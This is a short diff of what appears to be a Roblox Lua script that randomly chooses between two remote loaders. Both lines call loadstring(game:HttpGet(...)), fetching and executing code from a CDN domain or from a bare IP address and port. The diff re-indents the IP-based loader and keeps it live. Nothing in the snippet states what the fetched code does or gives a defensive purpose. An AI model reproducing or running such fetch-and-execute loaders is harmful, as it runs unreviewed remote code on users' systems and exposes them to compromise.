@@ -7,7 +7,6 @@ if chance <= 20 then
     ID = "d98f46c5-df0d-4ba3-9db0-61244be7c8e6"
     loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
 else
-    lua
-ID="f5f9f046-d0c9-48c3-9b85-bf15b9fa1f7c";
-loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
+    ID="f5f9f046-d0c9-48c3-9b85-bf15b9fa1f7c";
+    loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
 end
